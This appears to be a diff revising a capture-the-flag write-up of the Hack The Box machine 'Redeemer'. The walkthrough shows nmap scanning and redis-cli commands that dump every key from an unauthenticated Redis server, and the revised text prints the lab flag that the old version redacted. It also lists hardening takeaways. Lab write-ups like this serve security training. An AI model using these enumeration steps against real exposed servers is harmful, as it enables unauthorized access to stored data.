@@ -11,62 +11,72 @@ tags: [htb, starting-point, linux, redis, no-auth]
 
 > **Disclaimer:** This writeup is published after the machine was retired from Hack The Box. All flags are unique per user.
 
-# Redeemer — HTB Starting Point
+# Redeemer
 
-## Target Info
+**Hack The Box** · Very Easy · Linux
 
-| Field | Value |
-|-------|-------|
-| Platform | HTB Starting Point |
-| Target IP | <TARGET_IP> |
-| Attack IP | <ATTACK_IP> |
-| OS | Linux (5.4.0-77-generic) |
-| Difficulty | Very Easy |
+`Redis` · `No Authentication` · `In-Memory Data Store`
 
-## Recon
+---
 
-### Nmap Scan
-- **Port 6379/tcp** — Redis 5.0.7 (no authentication)
-- No other ports open on default top 1000
+## Overview
 
-## Enumeration
+Redeemer introduces Redis — an in-memory key-value store often used for caching and session management. The machine runs a Redis instance with no authentication, allowing anyone to connect and dump all stored data.
 
-### Redis Info
-- Version: 5.0.7
-- Mode: standalone
-- Config: `/etc/redis/redis.conf`
-- No authentication required
+---
 
-### Keys (DB 0)
-| Key | Value |
-|-----|-------|
-| flag | `<flag_redacted>` |
-| numb | `bb2c8a7506ee45cc981eb88bb81dddab` |
-| stor | `e80d635f95686148284526e1980740f8` |
-| temp | `1c98492cd337252698d0c5f631dfb7ae` |
+## Reconnaissance
 
-## Exploitation
+```bash
+nmap -sC -sV -p- <TARGET_IP>
+```
 
-- Connected with `redis-cli -h <TARGET_IP>`
-- No auth needed — `INFO server` and `KEYS *` worked immediately
-- `GET flag` returned the flag
+```
+PORT     STATE SERVICE VERSION
+6379/tcp open  redis   Redis key-value store 5.0.7
+```
 
-## Flags
+Only one port, but it's outside nmap's default top 1000 scan. A standard `nmap -sC -sV` would miss this entirely — you need `-p 6379` or a full port scan (`-p-`) to catch it. Redis 5.0.7, no authentication banner.
 
-- [x] Root flag: `<flag_redacted>`
+---
 
-## Lessons Learned
+## Dumping Redis Without Authentication
 
-- Redis without authentication exposes all data — always require `requirepass` in production
-- Redis default port 6379 is outside nmap's top 1000 — use `-p 6379` or `-p-` to catch it
-- `redis-cli` provides full interactive access: `INFO`, `KEYS *`, `GET`, `SELECT` for DB switching
-- In-memory data stores are high-value targets — often contain session tokens, caches, or flags
+Redis is designed to be accessed by trusted clients inside a trusted network. When exposed without a password, it's fully open.
 
-## Timeline
+```bash
+redis-cli -h <TARGET_IP>
+```
 
-| Time | Action |
-|------|--------|
-| 2026-02-16 | Started — target spawned |
-| 2026-02-16 | Nmap targeted scan — Redis 5.0.7 on 6379 |
-| 2026-02-16 | Redis no-auth access — enumerated 4 keys |
-| 2026-02-16 | Flag retrieved — box complete |
+```
+<TARGET_IP>:6379> INFO server
+# Server
+redis_version:5.0.7
+config_file:/etc/redis/redis.conf
+
+<TARGET_IP>:6379> KEYS *
+1) "temp"
+2) "stor"
+3) "numb"
+4) "flag"
+
+<TARGET_IP>:6379> GET flag
+"03e1d2b376c37ab3f5319922053953eb"
+```
+
+`INFO server` confirms the version and that no password is set. `KEYS *` dumps every key in the current database (DB 0). Four keys total — one of them is literally named `flag`. `GET flag` retrieves it.
+
+For a real engagement, you'd also want to check other databases (`SELECT 1` through `SELECT 15`) and look for session tokens, cached credentials, or application data.
+
+---
+
+## Takeaways
+
+- Redis without authentication exposes all stored data. Production instances must set `requirepass` in `redis.conf`.
+- Port 6379 is outside nmap's top 1000 — always include it explicitly (`-p 6379`) or scan all ports when testing infrastructure.
+- In-memory data stores are high-value targets. They often hold session tokens, cached API responses, and temporary credentials that never hit disk.
+- Key Redis commands for enumeration: `INFO` (server details), `KEYS *` (list all keys), `GET` (retrieve values), `SELECT` (switch databases).
+
+---
+
+*Walkthrough by Jack — 2026-02-16*
